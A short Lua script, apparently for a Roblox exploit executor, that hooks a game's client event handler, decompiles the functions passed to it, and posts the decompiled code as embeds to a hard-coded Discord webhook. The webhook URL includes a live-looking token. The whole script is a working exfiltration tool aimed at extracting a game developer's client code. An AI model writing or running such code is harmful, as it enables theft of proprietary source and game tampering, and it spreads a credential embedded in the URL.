local HttpService = game:GetService("HttpService")
local Webhook = "https://discord.com/api/webhooks/1480059199357583556/iDnRY5EM4XxO-KRbhnsdMyaWKLG3nC3LBHE2b6ToXdwFinWNZioNT7UEukkR1Cc5TDHK"

function send(msg,name)
	pcall(request({
		Url = Webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode({
			embeds = {{
				description = msg,
				color = 3066993,
				author = {
					name = name
				}
			}}
		})
	}))
end

local Events = require(game.ReplicatedStorage.Events)

hookfunction(Events.ClientListen, function(v1,v2)
	local output = decompile(v2) 
	
	return send(output,v1)
end)
